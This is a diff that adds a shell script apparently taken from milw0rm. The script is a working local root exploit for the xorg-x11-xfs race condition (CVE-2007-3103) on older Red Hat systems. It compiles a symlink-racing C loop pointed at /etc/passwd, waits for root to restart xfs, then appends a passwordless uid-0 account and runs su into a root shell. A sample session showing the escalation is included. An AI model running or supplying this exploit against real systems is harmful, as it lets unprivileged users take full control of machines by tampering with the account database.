@@ -1,0 +1,74 @@
+#!/bin/sh
+# Xorg-x11-xfs Race Condition Vuln local root exploit (CVE-2007-3103)
+# 
+# Another lame xploit by vl4dZ :)) works on redhat el5 and before 
+#
+#  $ id
+#  uid=1001(kecos) gid=1001(user) groups=1001(user)
+#  $ sh xfs-RaceCondition-root-exploit.sh 
+#  [*] Generate large data file in /tmp/.font-unix
+#  [*] Wait for xfs service to be (re)started by root...
+#  [*] Hop, symlink created...
+#  [*] Launching root shell
+#  -sh-3.1# id
+#  uid=0(root) gid=0(root) groups=0(root)
+
+# Vulnerable version is xorg-x11-xfs <= 1.0.2-3.1 and vulnerable code is 
+# located in the start() function of the /etc/init.d/xfs script:
+# ...
+#    rm -rf $FONT_UNIX_DIR
+#    mkdir $FONT_UNIX_DIR
+#    chown root:root $FONT_UNIX_DIR
+#    chmod 1777 $FONT_UNIX_DIR
+# ...
+
+# I'm listening right now to nice free music: 
+# http://www.jamendo.com/fr/album/5919
+
+FontDir="/tmp/.font-unix"
+Zero=/dev/zero
+Size=900000
+
+if [ ! -d $FontDir ]; then
+   printf "Is xfs running ?\n"
+   exit 1
+fi
+
+cd /tmp
+cat > sym.c << EOF
+#include <unistd.h>
+int main(){
+for(;;){if(symlink("/etc/passwd","/tmp/.font-unix")==0)
+{return 0;}}}
+EOF
+
+cc sym.c -o sym>/dev/null 2>&1
+if [ $? != 0 ]; then
+   printf "Error: Cant compile code"
+   exit 1
+fi
+
+printf "[*] Generate large data file in $FontDir\n"
+dd if=${Zero} of=${FontDir}/BigFile bs=1024 count=${Size}>/dev/null 2>&1
+if [ $? != 0 ]; then
+   printf "Error: cant create large file"
+   exit 1
+fi
+
+printf "[*] Wait for xfs service to be (re)started by root...\n"
+./sym
+if [ $? != 0 ]; then
+   printf "Error: code failed...\n"
+   exit 1
+fi
+
+if [ -L /tmp/.font-unix ]; then
+    printf "[*] Hop, symlink created...\n"
+    printf "[*] Launching root shell\n"
+    sleep 2
+    rm -f /tmp/.font-unix
+    echo "r00t::0:0::/:/bin/sh" >> /etc/passwd
+fi
+su - r00t
+
+# milw0rm.com [2008-02-21]
